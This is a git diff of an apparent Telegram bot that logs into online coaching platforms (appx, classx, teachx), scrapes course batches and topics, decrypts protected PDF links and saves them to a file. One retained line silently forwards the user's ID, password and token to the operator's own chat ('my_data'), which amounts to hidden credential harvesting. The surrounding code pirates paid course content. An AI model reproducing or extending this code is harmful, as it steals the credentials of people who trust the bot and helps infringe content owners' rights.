@@ -124,9 +124,10 @@ async def start(bot, m):
             print(aa)
             cool = ""
         cool += aa
-    await editable.edit(f"Login successfull....⚙️")
-    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}") 
-    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
+    #await editable.edit(f"Login successfull....⚙️")
+    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**token :** `{token}${userid}`\n\n{cool}")
+    editable1 = await bot.send_message(m.chat.id, f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
+    await editable1.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
     input1 = await bot.listen(editable.chat.id)
     raw_text1 = input1.text
 
@@ -141,13 +142,15 @@ async def start(bot, m):
     topicid = output3["data"]
     for topic in topicid:
         tids = topic["subjectid"]
-        subject_title = topic["subject_name"].replace(':', '')    
+        subject_title = topic["subject_name"].replace(':', '')
+        await editable1.edit(f"Extracting...🌀 Data From :**{raw_text1} {course_title}** {tids} {subject_title}")
         scraper = cloudscraper.create_scraper()
         html4 = scraper.get("https://"+raw_text05+"/get/alltopicfrmlivecourseclass?courseid=" + raw_text1 + "&subjectid=" + tids, headers=hdr).content
         output4 = json.loads(html4)
         vv = output4["data"]
         tsids_list = []
         for data in vv:
+            topic_name = data['topic_name']
             tsids = data['topicid']
             tsids_list.append(tsids)
         for tsids in tsids_list:
@@ -163,12 +166,12 @@ async def start(bot, m):
                 pdf_link2 = video["pdf_link2"]
                 if pdf_link and pdf_link != fuck:
                     pdf_link_decrypted = decrypt(pdf_link.split(":")[0])
-                    video_link += f"\n({subject_title}) {video_title} PDF :{pdf_link_decrypted}"    
+                    video_link += f"\n ({topic_name}) ({subject_title}) {video_title} PDF :{pdf_link_decrypted}"    
                 if pdf_link2:
                     pdf_link2_decrypted = decrypt(pdf_link2.split(":")[0])
-                    video_link += f"\n({subject_title}) {video_title} PDF-2 :{pdf_link2_decrypted}"
+                    video_link += f"\n({topic_name}) ({subject_title}) {video_title} PDF-2 :{pdf_link2_decrypted}"
                 with open(f"{course_title}.txt", 'a') as f:
-                    f.write(f"({subject_title}) {video_title}:{video_link}\n")
+                    f.write(f" ({topic_name}) ({subject_title}) {video_title}:{video_link}\n")
                    
  
     caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
